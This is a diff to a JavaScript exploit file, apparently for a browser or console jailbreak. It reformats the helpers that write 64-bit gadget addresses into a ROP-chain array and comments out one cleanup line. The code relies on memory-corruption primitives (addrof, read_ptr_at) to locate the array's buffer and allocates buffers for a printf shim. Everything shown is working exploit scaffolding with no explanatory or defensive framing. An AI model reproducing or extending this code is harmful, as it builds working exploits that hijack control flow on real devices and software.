@@ -1,20 +1,21 @@
 var ropchain_array = new Uint32Array(55002);
 var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
 var ropchain_offset = 2;
-let set_gadget = function(val)
+
+var set_gadget = function(val)
 {
-    ropchain_array[ropchain_offset++] = val | 0;
-    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
+ropchain_array[ropchain_offset++] = val | 0;
+ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
 }
-let set_gadgets = function(l)
+var set_gadgets = function(l)
 {
-    for(let i = 0; i < l.length; i++)
-        set_gadget(l[i]);
+for(let i = 0; i < l.length; i++)
+set_gadget(l[i]);
 }
-let db = function(data)
+var db = function(data)
 {
-    for(let i = 0; i < data.length; i++)
-        ropchain_array[ropchain_offset++] = data[i];
+for(let i = 0; i < data.length; i++)
+ropchain_array[ropchain_offset++] = data[i];
 }
 var main_ret = malloc(8);
 var printf_buf = malloc(65536);
@@ -11415,7 +11416,7 @@ var printf_buf_end = null;
 var printf_ans = null;
 var printf_buf = null;
 var ropchain_array = null;
-var ropchain = null;
+//var ropchain = null;
 var ropchain_offset = null;
 var printf_buf_offset = null;
 var __swbuf_addr = null;
